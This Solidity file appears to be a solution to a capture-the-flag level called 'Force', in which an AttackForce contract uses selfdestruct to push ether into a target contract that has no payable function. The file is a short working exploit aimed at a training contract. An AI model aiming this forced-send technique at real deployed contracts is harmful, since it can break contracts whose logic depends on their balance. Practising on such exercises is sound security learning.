pragma solidity ^0.7.1;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract AttackForce {
    address force;
    constructor(address victim){
        force = victim;
    }

    receive() external payable {

    }

    function sendAll() public {
        // replace by your instance address
        selfdestruct(payable(force));
    }
}